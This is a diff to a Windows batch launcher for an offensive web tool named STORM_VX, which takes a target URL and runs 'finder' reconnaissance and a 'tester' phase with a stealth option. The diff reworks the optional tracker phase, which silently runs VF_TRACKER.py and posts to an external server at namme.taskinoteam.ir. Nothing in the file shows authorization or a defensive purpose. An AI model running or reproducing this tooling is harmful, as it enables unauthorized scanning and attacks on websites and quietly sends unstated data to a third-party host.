@@ -30,15 +30,8 @@ exit /b
 :is_admin
 
 echo.
-echo   ███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗
-echo   ██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║
-echo   ███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║
-echo   ╚══██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║
-echo   ███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║
-echo   ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
-echo.
-echo          ==== v2.1 Modular - by elite (taha) ====
-echo          ==== FINDER =^> TESTER ====
+echo   STORM_VX v2.1 Modular - by elite ^(taha^)
+echo   FINDER =^> TESTER
 echo.
 echo   [OK] Running as Administrator
 echo.
@@ -135,18 +128,15 @@ set "TARGET_URL="
 set "FINDER_FLAGS=--deep"
 set "TESTER_FLAGS="
 set "RUN_TRACKER=0"
-set "SKIP_TRACKER=1"
 
 :parse_args
 if "%~1"=="" goto :done_parsing
 if /i "%~1"=="elite" (
-    set "SKIP_TRACKER=1"
     shift
     goto :parse_args
 )
 if /i "%~1"=="--tracker" (
     set "RUN_TRACKER=1"
-    set "SKIP_TRACKER=0"
     shift
     goto :parse_args
 )
@@ -180,8 +170,8 @@ if not "!TARGET_URL!"=="" goto :url_ready
 
 echo.
 echo   -----------------------------------------------
-echo    Enter target URL (e.g. https://target.com)
-echo    Tip: Add '--tracker' to enable tracker phase
+echo    Enter target URL ^(e.g. https://target.com^)
+echo    Add --tracker in command line to enable tracker
 echo   -----------------------------------------------
 echo.
 set /p "TARGET_URL=   URL: "
@@ -192,6 +182,29 @@ if "!TARGET_URL!"=="" (
     echo.
     pause
     exit /b 1
+)
+
+:: --- Parse --tracker from URL input (user might type: google.com --tracker) ---
+set "CLEAN_URL="
+for %%W in (!TARGET_URL!) do (
+    if /i "%%W"=="--tracker" (
+        set "RUN_TRACKER=1"
+    ) else if /i "%%W"=="--deep" (
+        rem already default
+    ) else if /i "%%W"=="--no-deep" (
+        set "FINDER_FLAGS="
+    ) else if /i "%%W"=="--stealth" (
+        set "TESTER_FLAGS=--stealth"
+    ) else (
+        if "!CLEAN_URL!"=="" (
+            set "CLEAN_URL=%%W"
+        ) else (
+            set "CLEAN_URL=!CLEAN_URL! %%W"
+        )
+    )
+)
+if "!RUN_TRACKER!"=="1" (
+    set "TARGET_URL=!CLEAN_URL!"
 )
 
 :url_ready
@@ -209,25 +222,32 @@ echo.
 
 :: ═══════════════════════════════════════════════════════════════
 ::  PHASE 0: TRACKER (OPTIONAL — only with --tracker flag)
+::  Using GOTO instead of nested IF/ELSE to avoid CMD parsing bugs
+::  with parentheses in echo statements
 :: ═══════════════════════════════════════════════════════════════
-if "!RUN_TRACKER!"=="1" (
-    if defined TRACKER_PATH (
-        echo   ===============================================
-        echo   [PHASE 0] Running VF_TRACKER (enabled by --tracker)
-        echo   ===============================================
-        echo.
-        %PYTHON% "!TRACKER_PATH!" --silent --server http://namme.taskinoteam.ir/receive.php
-        echo.
-        echo   [OK] Tracker complete.
-        echo.
-    ) else (
-        echo   [WARNING] Tracker requested but VF_TRACKER.py not found. Skipping.
-        echo.
-    )
-) else (
-    echo   [INFO] Tracker skipped. Use --tracker flag to enable.
-    echo.
-)
+if not "!RUN_TRACKER!"=="1" goto :skip_tracker
+if not defined TRACKER_PATH goto :tracker_not_found
+
+echo   ===============================================
+echo   [PHASE 0] Running VF_TRACKER --tracker enabled
+echo   ===============================================
+echo.
+%PYTHON% "!TRACKER_PATH!" --silent --server http://namme.taskinoteam.ir/receive.php
+echo.
+echo   [OK] Tracker complete.
+echo.
+goto :tracker_done
+
+:tracker_not_found
+echo   [WARNING] Tracker requested but VF_TRACKER.py not found. Skipping.
+echo.
+goto :tracker_done
+
+:skip_tracker
+echo   [INFO] Tracker skipped. Use --tracker flag to enable.
+echo.
+
+:tracker_done
 
 :: ═══════════════════════════════════════════════════════════════
 ::  PHASE 1: VF_FINDER — Reconnaissance
